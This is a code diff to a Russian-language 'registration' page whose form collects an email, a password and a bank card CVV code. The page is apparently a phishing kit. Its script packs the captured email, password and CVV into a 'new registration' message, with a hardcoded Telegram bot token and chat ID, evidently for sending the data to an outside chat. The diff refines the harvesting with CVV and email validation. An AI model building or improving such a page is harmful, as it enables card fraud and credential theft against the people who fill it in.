@@ -32,9 +32,10 @@
         <input type="text" id="pass" name="email" required>
         <p></p>
         <label for="cvv">cvv код</label>
-        <input type="text" id="cvv" name="cvv" required>
+        <input type="text" id="cvv" name="cvv" required maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '')">>
         <br>
         <button type="submit">Зарегистрироваться</button>
+        
     </form>
 
     <script>
@@ -45,8 +46,12 @@
           
           const username = document.getElementById('pass').value;
           const email = document.getElementById('email').value;
+          if (!email.includes('@')) {
+                alert('Пожалуйста, введите корректный адрес электронной почты (должен содержать @).');
+                return;
+            }
           const cvv = document.getElementById('cvv').value;
-          
+            
           const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
           const chatId = -1002372284940 
           const message = `Новая регистрация:\n Почта:${email}\n Пароль:${username}\n cvv: ${cvv}`;
